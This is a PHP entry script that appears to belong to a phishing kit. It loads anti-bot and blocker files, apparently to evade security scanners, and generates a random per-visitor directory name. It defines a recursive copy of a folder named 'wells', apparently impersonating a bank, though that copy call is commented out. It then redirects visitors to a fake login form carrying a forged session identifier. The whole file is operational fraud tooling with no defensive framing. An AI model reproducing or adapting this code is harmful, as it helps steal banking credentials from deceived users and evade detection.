<?php

session_start();

// ANITBOTS
include('../antibots.php');
include('../blocker.php');

$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 8);

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="wells";
/*recurse_copy( $src, $dst ); */
header("location:".$dst."");  
header("location: login/index.php?login_form=True&session_Id=".md5(microtime())); 
exit;
?>
